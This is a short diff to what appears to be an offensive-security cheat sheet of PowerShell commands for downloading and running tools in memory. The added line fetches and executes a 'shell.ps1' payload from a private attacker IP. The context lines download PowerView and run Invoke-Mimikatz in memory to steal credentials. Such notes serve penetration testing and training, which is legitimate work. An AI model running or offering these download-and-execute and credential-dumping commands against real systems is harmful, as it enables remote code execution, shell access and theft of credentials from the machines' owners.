@@ -498,6 +498,9 @@ wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanR
 (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
 
 # Execute a file in memory using PowerShell
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.190:443/shell.ps1')"
+
+# Execute a file in memory using PowerShell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
 # Execute a file in memory using PowerShell
